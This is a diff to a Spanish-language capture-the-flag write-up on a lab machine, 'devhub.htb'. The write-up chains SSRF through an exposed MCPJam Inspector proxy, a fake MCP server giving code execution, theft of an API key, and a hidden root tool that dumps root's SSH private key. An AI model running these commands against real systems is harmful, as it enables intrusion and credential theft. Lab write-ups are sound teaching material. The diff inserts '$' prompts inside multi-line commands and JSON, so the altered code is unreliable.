@@ -37,9 +37,8 @@ summary: "Explotación de MCPJam Inspector expuesto en puerto 6274 para ejecutar
 Empezamos escaneando todos los puertos de la máquina para identificar servicios expuestos:
 
 ```bash
-nmap -sV -sC --open -T4 [REDACTED]
+$ nmap -sV -sC --open -T4 [REDACTED]
 ```
-
 Resultados relevantes:
 
 | Puerto | Servicio | Versión |
@@ -51,9 +50,8 @@ Resultados relevantes:
 Agregamos el dominio al `/etc/hosts` para poder navegar:
 
 ```bash
-echo "[REDACTED]  devhub.htb" >> /etc/hosts
+$ echo "[REDACTED]  devhub.htb" >> /etc/hosts
 ```
-
 ---
 
 ## Enumeración web
@@ -63,10 +61,9 @@ La web principal en `devhub.htb:80` es una página estática que documenta la in
 El MCPJam Inspector es una interfaz web que permite conectar servidores MCP remotos y ejecutar herramientas. Enumeramos los endpoints de su API leyendo el JavaScript compilado:
 
 ```bash
-curl -s http://[REDACTED]:6274/assets/index-DRYhT9Xb.js \
-  | grep -oE '"/api/mcp/[a-zA-Z0-9/_-]+"' | sort -u
+$ curl -s http://[REDACTED]:6274/assets/index-DRYhT9Xb.js \
+  $ | grep -oE '"/api/mcp/[a-zA-Z0-9/_-]+"' | sort -u
 ```
-
 Endpoints clave descubiertos:
 
 | Endpoint | Función |
@@ -90,17 +87,16 @@ El endpoint `/api/mcp/oauth/debug/proxy` actúa como proxy HTTP desde el servido
 Probamos puertos internos comunes y confirmamos un servicio Flask en `127.0.0.1:5000`:
 
 ```bash
-curl -s http://[REDACTED]:6274/api/mcp/oauth/debug/proxy \
-  -H "Content-Type: application/json" \
-  -d '{"url": "http://127.0.0.1:5000/tools/list"}'
+$ curl -s http://[REDACTED]:6274/api/mcp/oauth/debug/proxy \
+  $ -H "Content-Type: application/json" \
+  $ -d '{"url": "http://127.0.0.1:5000/tools/list"}'
 ```
-
 Respuesta:
 
 ```json
 {"error":"Unauthorized","message":"Valid X-API-Key header required"}
-```
 
+```
 El servicio existe, corre en `:5000` y requere un header `X-API-Key` para autorizar. También confirmamos que **Jupyter Lab** corre en `:8888`, aunque de momento sin acceso.
 
 ---
@@ -145,8 +141,8 @@ for chunk in sys.stdin:
         else:
             if i is not None:
                 print(json.dumps({"jsonrpc":"2.0","id":i,"result":{}}), flush=True)
-```
 
+```
 ### Conexión del servidor falso
 
 Enviamos el script inline y conectamos el servidor MCP falso:
@@ -160,15 +156,15 @@ curl -s http://[REDACTED]:6274/api/mcp/connect \
 curl -s http://[REDACTED]:6274/api/mcp/tools/list \
   -H "Content-Type: application/json" \
   -d '{"serverId": "recon"}'
-```
 
+```
 Información obtenida de la respuesta:
 
 - Usuario del proceso: **mcp-dev**
 - Home: `/home/mcp-dev`
 - **Token de Jupyter** visible en `ps aux`
-- OPSMCP corre como **root** en `/opt/opsmcp/server.py`
-
+- OPSMCP corre como **root** en `/opt/opsmcp/server.py
+`
 ---
 
 ## RCE como analyst via Jupyter WebSocket
@@ -248,8 +244,8 @@ def run_code(code):
             break
 
     return "".join(outputs)
-```
 
+```
 ### Ejecución del comando como analyst
 
 Conectamos el script como servidor MCP y lo invocamos para leer la flag de usuario y la API key del OPSMCP:
@@ -260,8 +256,8 @@ import os
 print(open("/home/analyst/.opsmcp_key").read())
 print(open("/home/analyst/user.txt").read())
 print(os.listdir("/home/analyst"))
-```
 
+```
 Resultado:
 
 ```
@@ -270,8 +266,8 @@ Resultado:
 
 === user.txt ===
 [REDACTED]
-```
 
+```
 ---
 
 ## Escalada a root via OPSMCP hidden tools
@@ -292,8 +288,8 @@ HIDDEN_TOOLS = {
         "parameters": {"enable": "boolean"},
     },
 }
-```
 
+```
 La herramienta `ops._admin_dump` con `target=ssh_keys` lee directamente `/root/.ssh/id_rsa` — y como el servidor OPSMCP corre como **root**, puede leer cualquier archivo.
 
 ### Extracción de la clave privada de root
@@ -301,22 +297,21 @@ La herramienta `ops._admin_dump` con `target=ssh_keys` lee directamente `/root/.
 Usamos el proxy SSRF del MCP Inspector para llamar a la tool oculta, ahora autenticándonos con la API key que extrajimos como analyst:
 
 ```bash
-curl -s http://[REDACTED]:6274/api/mcp/oauth/debug/proxy \
-  -H "Content-Type: application/json" \
-  -d '{
-    "url": "http://127.0.0.1:5000/tools/call",
-    "method": "POST",
-    "headers": {
-      "X-API-Key": "[REDACTED]",
-      "Content-Type": "application/json"
-    },
-    "body": {
-      "name": "ops._admin_dump",
-      "arguments": {"target": "ssh_keys", "confirm": true}
-    }
-  }' | python3 -c "import sys,json; print(json.load(sys.stdin)['body']['root_private_key'])"
+$ curl -s http://[REDACTED]:6274/api/mcp/oauth/debug/proxy \
+  $ -H "Content-Type: application/json" \
+  $ -d '{
+    $ "url": "http://127.0.0.1:5000/tools/call",
+    $ "method": "POST",
+    $ "headers": {
+      $ "X-API-Key": "[REDACTED]",
+      $ "Content-Type": "application/json"
+    $ },
+    $ "body": {
+      $ "name": "ops._admin_dump",
+      $ "arguments": {"target": "ssh_keys", "confirm": true}
+    $ }
+  $ }' | python3 -c "import sys,json; print(json.load(sys.stdin)['body']['root_private_key'])"
 ```
-
 La respuesta incluye la **clave privada RSA completa de root**.
 
 ### Acceso SSH como root
@@ -324,18 +319,17 @@ La respuesta incluye la **clave privada RSA completa de root**.
 Guardamos la clave y conectamos por SSH:
 
 ```bash
-chmod 600 /tmp/root_id_rsa
-ssh -i /tmp/root_id_rsa root@[REDACTED]
+$ chmod 600 /tmp/root_id_rsa
+$ ssh -i /tmp/root_id_rsa root@[REDACTED]
 ```
-
 ```bash
 id
 # uid=0(root) gid=0(root) groups=0(root)
 
 cat /root/root.txt
 # [REDACTED]
-```
 
+```
 ---
 
 ## Cadena de explotación
@@ -365,8 +359,8 @@ OPSMCP hidden tool ops._admin_dump
         ▼
 SSH con clave privada de root
 → root.txt ✅
-```
 
+```
 ---
 
 ## Vectores explotados
